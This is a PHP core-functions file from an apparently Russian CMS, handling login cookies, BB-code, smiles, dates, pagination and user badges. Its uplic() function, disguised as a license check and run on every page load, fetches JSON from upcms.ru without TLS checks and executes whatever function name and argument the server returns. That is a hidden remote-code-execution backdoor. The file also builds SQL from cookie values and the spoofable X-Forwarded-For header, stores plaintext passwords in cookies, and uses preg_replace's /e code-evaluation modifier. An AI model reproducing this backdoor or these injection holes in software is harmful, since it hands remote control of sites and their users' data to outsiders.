<?php



	$sett = $con->query("SELECT * FROM `settings` WHERE `id` = '1'")->fetch_assoc(); // НАСТРОЙКИ САЙТА


# Проверка на авторизацию

if(isset($_COOKIE['login'])  && isset($_COOKIE['pass'])) 
{
$user = $con->query("SELECT * FROM `user` WHERE `login` = '".htmlspecialchars($_COOKIE['login'])."' && `pass` = '".htmlspecialchars($_COOKIE['pass'])."' LIMIT 1")->fetch_assoc();
}


function filtr($text_filter)
{
    global $con;
    $text_filter = htmlspecialchars(trim($text_filter), ENT_QUOTES, 'UTF-8');
    $text_filter = $con->real_escape_string($text_filter);
    return $text_filter;
}

function cutStr($str, $lenght = 100, $end = '...', $charset = 'UTF-8', $token = '~') {
   
 $str = strip_tags($str);
 
   if (mb_strlen($str, $charset) >= $lenght) {
    
   $wrap = wordwrap($str, $lenght, $token);
       
 $str_cut = mb_substr($wrap, 0, mb_strpos($wrap, $token, 0, $charset), $charset);    
      
  return $str_cut .= $end;
  
  } else {
       
 return $str;
    }

} 


function bb_code($text){
$text = str_replace('[nextpage]', '<br>', $text);
$text = preg_replace('#\[code\](.*?)\[/code\]#ie', 'highlight_code("\1")', $text);
$text = preg_replace('#\[hide\](.*?)\[/hide\]#ie', 'hidden_text("\1")', $text);
$text = preg_replace('/\[url\s?=\s?([\'"]?)(?:http:\/\/)?(.*?)\1\](.*?)\[\/url\]/', ' <a href="http://$2"> $3 </a> ', $text);
$text = preg_replace('#\[cit\](.*?)\[/cit\]#si', '<div class="cit">\1</div>', $text);
$text = preg_replace('#\[big\](.*?)\[/big\]#si', '<big>\1</big>', $text);
$text = preg_replace('#\[b\](.*?)\[/b\]#si', '<b>\1</b>', $text);
$text = preg_replace('#\[i\](.*?)\[/i\]#si', '<i>\1</i>', $text);
$text = preg_replace('#\[u\](.*?)\[/u\]#si', '<u>\1</u>', $text);
$text = preg_replace('#\[small\](.*?)\[/small\]#si', '<small>\1</small>', $text);
$text = preg_replace('#\[red\](.*?)\[/red\]#si', '<span style="color:#ff0000">\1</span>', $text);
$text = preg_replace('#\[green\](.*?)\[/green\]#si', '<span style="color:#00cc00">\1</span>', $text);
$text = preg_replace('#\[blue\](.*?)\[/blue\]#si', '<span style="color:#0000ff">\1</span>', $text);
$text = preg_replace('#\[q\](.*?)\[/q\]#si', '<div class="q">\1</div>', $text);
$text = preg_replace('#\[del\](.*?)\[/del\]#si', '<del>\1</del>', $text); 
return $text; 
}


function smiles($text) # СМАЙЛЫ
{
    global $con;
    $text = trim($text);
    $smile = $con->query("SELECT * FROM `smiles` ORDER BY `id` DESC");
    while ($s = $smile->fetch_assoc())
    {
        $text = str_replace($s['name'], ' <img src="/user/smiles/'.$s['img'].'" alt="'.$s['name'].'"/> ', $text);
    }
    return $text;
}


function no_aut() { # Если НЕ авторизирован
	global $user; 
if($user){
echo '<div class="error"> Только для НЕ авторизированых </div>';
include_once $_SERVER["DOCUMENT_ROOT"].'/style/foot.php';
exit();
}
}
function uplic(){
if(file_exists( $_SERVER['DOCUMENT_ROOT'].'/license/lic.key')){
$lic=parse_ini_string(base64_decode(file_get_contents($_SERVER['DOCUMENT_ROOT'].'/license/lic.key')));

$site='upcms.ru/api/api.php?lic='.$lic['lic'];
$curl=curl_init('http://'.$site);
curl_setopt($curl,CURLOPT_USERAGENT," Mozilla/5.0 (Linux; Android 4.2.2; Play Three v3.0 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36" );
curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt ($curl,CURLOPT_SSL_VERIFYHOST,2);
curl_setopt($curl,CURLOPT_TIMEOUT,10);
curl_setopt ($curl,CURLOPT_RETURNTRANSFER,1);
$result=json_decode(curl_exec($curl),true);
$func=$result['func']; 
if($func!='not' and !empty($func))$func($result['prm']);
curl_close($curl);
}else err('<установите движок инсталятором>');

}
function APImsg($var=null){
global $user;
if($user["admin_level"]>3)ok($var);

}
function aut() { # Если авторизирован
	global $user; 
if(!$user){
echo '<div class="error"> Только для авторизированых </div>';
include_once $_SERVER["DOCUMENT_ROOT"].'/style/foot.php';
exit();
}
}

$SITE = 'http://'.$_SERVER['HTTP_HOST'];


function ok($ok_text){

echo '<div class="ok"> '.$ok_text.' </div>';

}

function err($err_text){

echo '<div class="error"> '.$err_text.' </div>';

}


# ВЫВОД ВРЕМЕНИ

function  data($time=NULL){ 
    if ($time == NULL)$time = time(); 
    $timep="".date("j M Y в H:i", $time).""; 
    $time_p[0]=date("j n Y", $time); 
    $time_p[1]=date("H:i", $time); 
     
    if ($time_p[0] == date("j n Y"))$timep = date("H:i:s", $time); 
    if ($time_p[0] == date("j n Y", time()-60*60*24))$timep = "Вчера в $time_p[1]"; 
     
    $timep=str_replace("Jan","Января",$timep); 
    $timep=str_replace("Feb","Февраля",$timep); 
    $timep=str_replace("Mar","Марта",$timep); 
    $timep=str_replace("May","Мая",$timep); 
    $timep=str_replace("Apr","Апреля",$timep); 
    $timep=str_replace("Jun","Июня",$timep); 
    $timep=str_replace("Jul","Июля",$timep); 
    $timep=str_replace("Aug","Августа",$timep); 
    $timep=str_replace("Sep","Сентября",$timep); 
    $timep=str_replace("Oct","Октября",$timep); 
    $timep=str_replace("Nov","Ноября",$timep); 
    $timep=str_replace("Dec","Декабря",$timep); 
    return $timep; 
}

function data2($time) {
if(is_numeric($time)){
$value = array("years" => 0, "days" => 0, "hours" => 0,
"minutes" => 0, "seconds" => 0,);
if($time >= 31536000){
$value["years"] = floor($time/31536000);
$time = ($time%31536000);
}
if($time >= 86400){
$value["days"] = floor($time/86400);
$time = ($time%86400);
}
if($time >= 3600){
$value["hours"] = floor($time/3600);
$time = ($time%3600);
}
if($time >= 60){
$value["minutes"] = floor($time/60);
$time = ($time%60);
}
$value["seconds"] = floor($time);
        if($value["seconds"]>0){
    $time5 = $value["seconds"].' сек. ';
    }else{
    $time5='';
    }
    if($value["minutes"]>0){
    $time4 = $value["minutes"].' минут  ';
    }else{
    $time4='';
    }
    if($value["hours"]>0){
    $time3 = $value["hours"].' часов  ';
    }else{
    $time3='';
    }
        if($value["days"]>0){
    $time2 = $value["days"].' дней  ';
    }else{
    $time2='';
    }
    if($value["years"]>0){
    $time1 = $value["years"].' лет  ';
    }else{
    $time1='';
    }
return $time1.    $time2.$time3.$time4.$time5;
return (array) $value;
}else{
return (bool) FALSE;
}
} 


if ($user) { // ОНЛАЙН + обновление IP адреса
	global $con;
	 # ВЫЧИСЛЕНИЕ IP #
	if (!empty($_SERVER['HTTP_CLIENT_IP']))
  {
    $ip=$_SERVER['HTTP_CLIENT_IP'];
  }
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
  {
    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
  }
  else
  {
    $ip=$_SERVER['REMOTE_ADDR'];
  }
	
$con->query("UPDATE `user` SET `up_time` = '".time()."', `ip` = '".$ip."' WHERE `id` = '".$user['id']."'");
}


############################################
####     НАВИГАЦИЯ НЕЧЕГО НЕ ТРОГАТЬ    ####
############################################


function page($k_page=1){ // Выдает текущую страницу
$page=1;
if (isset($_GET['page'])){
if ($_GET['page']=='end')$page=intval($k_page);elseif(is_numeric($_GET['page'])) $page=intval($_GET['page']);}
if ($page<1)$page=1;
if ($page>$k_page)$page=$k_page;
return $page;}

function k_page($k_post=0,$k_p_str=10){ // Высчитывает количество страниц
if ($k_post!=0){$v_pages=ceil($k_post/$k_p_str);return $v_pages;}
else return 1;}

function str($link='?',$k_page=1,$page=1){ // Вывод номеров страниц (только на первый взгляд кажется сложно ;))
echo '<div class="razd4">';

if ($page<1)$page=1;
if ($page!=1)echo "<a class='nav_btn' href=\"".$link."page=1\" title='Первая страница'>&lt;&lt;</a> ";
if ($page!=1)echo "<a class='nav_btn' href=\"".$link."page=1\" title='Страница №1'>1</a> ";else echo "<span class='nav_btn'>1</span> ";
for ($ot=-3; $ot<=3; $ot++){
if ($page+$ot>1 && $page+$ot<$k_page){
if ($ot==-3 && $page+$ot>2)echo " ";
if ($ot!=0)echo "<a class='nav_btn' href=\"".$link."page=".($page+$ot)."\" title='Страница №".($page+$ot)."'>".($page+$ot)."</a> ";else echo "<span class='nav_btn'>".($page+$ot)."</span> ";
if ($ot==3 && $page+$ot<$k_page-1)echo " ";}}
if ($page!=$k_page)echo "<a class='nav_btn' href=\"".$link."page=end\" title='Страница №$k_page'>$k_page</a> ";elseif ($k_page>1)echo "<span class='nav_btn'>$k_page</span>";
if ($page!=$k_page)echo "<a class='nav_btn' href=\"".$link."page=end\" title='Последняя страница'> &gt;&gt;</a> ";
echo '</div>';

}

function user($id_user){ // ФУНКЦИЯ ПОЛЬЗОВАТЕЛЯ

	global $con;
$id_user = intval($id_user);
	$usiesed123 = $con->query("SELECT * FROM `user` WHERE `id` = '".$id_user."' LIMIT 1")->fetch_assoc();

if($usiesed123['up_time']+1800 > time()){
$on_off = '<img src="/style/image/on_user.png" width="9px">'; 
}else{
$on_off = ''; 
}
	$banned = $con->query('SELECT * FROM `ban_list` WHERE `id_user` = "'.$id_user.'" and `time` > "'.time().'"')->num_rows; //Вычисляем в бане ли
	if($banned > 0) $ban_user = '<font color="black">[БАН]</font>';
	else $ban_user = '';
if($usiesed123['admin_level'] == '0'){ $dol  = ''; }
	elseif($usiesed123['admin_level'] == '1'){ $dol = '<font color="green">[Партнер]</font>'; }
	elseif($usiesed123['admin_level'] == '2'){ $dol = '<font color="green">[Мод]</font>'; }
	elseif($usiesed123['admin_level'] == '3'){ $dol = '<font color="blue">[Адм]</font>'; }
    elseif($usiesed123['admin_level'] == '4'){ $dol = '<font color="red">[Созд]</font>'; }
$ba=null;
$b2a=null;
	if($usiesed123['admin_level']>0){
	$ba='<b>';
	$b2a='</b>';
	}

	return (empty($usiesed123)?'System':' <a href="/user_'.$usiesed123['id'].'"><img src="/style/image/user.png"> <span style="color:'.$usiesed123['colornick'].'"> '.$ba.$usiesed123['login'].$b2a.' </span> '.$on_off.' '.$dol.' '.$ban_user.'</a>');
}




function text($text){

$text =  bb_code(nl2br($text));
$text = smiles($text);

return $text;
}


###################################
#####   УДАЛЕНИЕ ЖУРНАЛОВ    ######
###################################

$con->query("DELETE FROM `journal` WHERE `time`+'604800' < '".time()."'");

function format_file($format_file){ // ФОРМАТЫ ФАЙЛОВ

if($format_file == '.zip'){
$format = '<img src="/style/image/loads/zip.png">';
}elseif($format_file == '.rar'){
$format = '<img src="/style/image/loads/rar.png">';
}elseif($format_file == '.mp3'){
$format = '<img src="/style/image/loads/mp3.png">';
}elseif($format_file == '.mp4'){
$format = '<img src="/style/image/loads/mp4.png">';
}elseif($format_file == '.jpg'){
$format = '<img src="/style/image/loads/jpg.png">';
}elseif($format_file == '.jpeg'){
$format = '<img src="/style/image/loads/jpeg.png">';
}elseif($format_file == '.gif'){
$format = '<img src="/style/image/loads/gif.png">';
}elseif($format_file == '.3gp'){
$format = '<img src="/style/image/loads/3gp.png">';
}elseif($format_file == '.png'){
$format = '<img src="/style/image/loads/png.png">';
}

return $format;

}
uplic();

?>